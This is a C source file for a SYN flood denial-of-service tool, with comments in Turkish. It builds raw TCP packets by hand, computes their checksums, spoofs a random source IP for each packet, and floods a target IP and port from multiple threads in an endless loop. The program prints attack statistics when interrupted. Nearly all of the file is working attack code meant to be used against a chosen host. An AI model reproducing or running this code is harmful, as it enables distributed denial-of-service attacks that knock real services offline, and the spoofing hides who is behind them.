#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include "src/tanitim.c"
#include "src/random-ip.c"


#define KRMZ   "\x1B[31m"
#define YSL   "\x1B[32m"
#define SR   "\x1B[33m"
#define MV   "\x1B[34m"
#define RESET "\x1B[0m"


struct sozde_baslik{
    unsigned int kaynak_adres;
    unsigned int hedef_adres;
    unsigned char placeholder; //rezerve
    unsigned char protokol;
    unsigned short tcp_uzunlugu;

    struct tcphdr tcp;
};

unsigned short csum(unsigned short *buf, int nbayt){
    unsigned long toplam;
    unsigned short oddbyte;
    unsigned short cevap;

    toplam = 0;

    while(nbayt > 1){
        toplam += *buf++;
        nbayt -= 2;
    } 

    if(nbayt == 1){
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char*)buf;
        toplam += oddbyte;
    }
    toplam = (toplam >> 16) + (toplam & 0xffff);
    toplam = toplam + (toplam >> 16);
    cevap = (short)~toplam;
    return(cevap);
}



int main(int argc, char *argv[]){

    if(argc != 5){
        printf(SR"[!]"RESET" Please enter the commands correctly\n");
        printf(YSL"USAGE:"RESET"  %s <source port> <target IP> <target port> <threads number>\n", argv[0]);
        exit(0);
    }

    tanitim();

    time_t baslangic, bitis;
    time(&baslangic);
    double zaman_farki;
                
                                                   
    //Ham soket olustur
    int soket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);

    //Datagram paketi hazirlar
    char datagram[4096], source_ip[32];

    //IP basligi
    struct iphdr *iph = (struct iphdr *)datagram;

    //TCP basligi
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
    struct sockaddr_in sin;
    struct sozde_baslik psh;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(atoi(argv[1])); //Kaynak portu belirttik.
    sin.sin_addr.s_addr = inet_addr(argv[2]); //Hedef IP ilerde kullanmak icin belirttik

    memset(datagram, 0, 4096);  //Datagramı set ediyoruz

    //IP basligini doldur
    char *str;
    str = (char *)malloc(20 * sizeof(char *));
    str = randomip();  

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph->id = htons(rand());  //Paketin ID'si
    iph->frag_off = 0;
    iph->ttl = 255; //time to live suresi en uzun 255 ayarladik.
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;      //Checksum hesaplanmadan once 0 ayarliyoruz
    iph->daddr = sin.sin_addr.s_addr; //Hedef IP'yi belirtmistik.
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);

    //TCP Basligi

    tcph->source = htons(atoi(argv[1]));
    tcph->dest = htons(atoi(argv[3]));
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;      /* ilk ve tek tcp segmenti*/
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (5840); /* max kabul edilen window boyutu*/
    tcph->check = 0;/* Eger checksumu 0 a ayarlarsak, kernelimiz iletim sırasında dogrusunu ayarlayacaktir */
    tcph->urg_ptr = 0;
    //IP cheksumu
     
    psh.hedef_adres = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protokol = IPPROTO_TCP;
    psh.tcp_uzunlugu = htons(20);
     
    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
     
    tcph->check = csum( (unsigned short*) &psh , sizeof (struct sozde_baslik));
     
    //IP_HDRINCL kernele headerin pakete include edildigini soyler
    int one = 1;
    const int *val = &one;
    if (setsockopt (soket, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        printf (KRMZ"[-]"RESET" IP_HDRINCL error! Error NO : %d . Error Message : %s \n" , errno , strerror(errno));
        exit(0);
    }
    else{
        printf(YSL"[+] "RESET"IP_HDRINCL success!\n");
    }
    unsigned long p_sayi = 0;

    //Attack fonksiyonu threadin argv parametrelerini kullanması için main fonksiyonunun icinde olusturuldu
    void *attack(void *bos){
        void bilgi(){
            time(&bitis);
            zaman_farki = difftime(bitis, baslangic);
            printf("\n\n----------------------------------------------------------");
            printf("\n\nNumber of PACKETS: "YSL"%d"RESET" \t Attack Time: "YSL"%.2f"RESET" second \n\n"RESET, p_sayi, zaman_farki);
            printf("----------------------------------------------------------\n\n");
            exit(1);
        }
        signal(SIGINT, bilgi);
        while (1){
        p_sayi++;
        
        //Paketi yolla
        if (sendto (soket,      // soketimiz 
                    datagram,   // buffer iceren basliklar ve veriler
                    iph->tot_len,    // datagramin toplam boyutu
                    0,      // yonlendirme bayragi genellikle 0 oluyor 
                    (struct sockaddr *) &sin,   // soket adresi
                    sizeof (sin)) < 0)       // normal bir send() 
        {
            printf ("[-] ERROR\n");
            exit(1);
        }
        //Basarili ise
        else
        {
            if(p_sayi == 1)
                printf(YSL"[+]"MV" Attack has been started!\n"RESET);

        }
        
        psh.kaynak_adres = htons(atoi(str));
        iph->saddr = inet_addr(str);
        iph->id = htons(rand());  //Paketin ID'si
        str = randomip(); //Bir IP SYN yolladiginda, hemen diger IP'yi uretiyoruz.
    }

    }

    int thread_number = atoi(argv[4]);
    pthread_t thread[thread_number];

    for(int i = 0; i < thread_number; i++){
        if(pthread_create(&thread[i], NULL, &attack, NULL) != 0){
            printf(KRMZ"[-]"RESET" Failed the create THREADS!\n");
            exit(1);
        }
        else{
            while(1)
                sleep(1); //Sonsuz DDoS attack with threads. Burada threadleri bekletiyoruz.
               
        }
    } 
       

    return 0;
}
